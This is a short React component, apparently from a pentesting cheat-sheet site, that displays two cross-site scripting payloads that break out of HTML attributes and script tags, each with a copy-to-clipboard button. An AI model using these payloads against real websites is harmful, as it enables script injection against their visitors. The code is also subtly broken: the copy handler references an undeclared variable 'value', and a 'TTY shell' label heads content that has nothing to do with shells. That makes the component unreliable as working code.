import React, {useState} from "react";
import SyntaxHighlighter from 'react-syntax-highlighter';
import {CopyToClipboard} from 'react-copy-to-clipboard';
import {PayloadsContainer, PayloadsCopyToClipboard, PayloadsHeading,} from "./PayloadsElements";
import {AiOutlineCopy} from 'react-icons/ai';
import {docco} from 'react-syntax-highlighter/dist/esm/styles/hljs';

const Payloads = () => {

    const PayloadsList = [
        "onload=alert(1)><svg/1=",
        ">alert(1)</script><script/1=",
    ];

    const [state, setState] = useState({
        value: '',
        copied: false,
    });

    const PayloadsListMap = PayloadsList.map((payload, index) => {
        return (
            <PayloadsCopyToClipboard key={index}>
                <SyntaxHighlighter language="javascript" style={docco}>
                    {payload}
                </SyntaxHighlighter>
                <CopyToClipboard text={payload} onCopy={() => setState({value, copied: true})}>
                    <AiOutlineCopy/>
                </CopyToClipboard>
            </PayloadsCopyToClipboard>
        );
    });

    return (
        <PayloadsContainer>
            <PayloadsHeading>Payloads</PayloadsHeading>
            <SyntaxHighlighter>TTY shell</SyntaxHighlighter>

            {PayloadsListMap}


            {state.copied ? <span style={{color: 'red'}}>Copied.</span> : null}

        </PayloadsContainer>
    );
};

export default Payloads;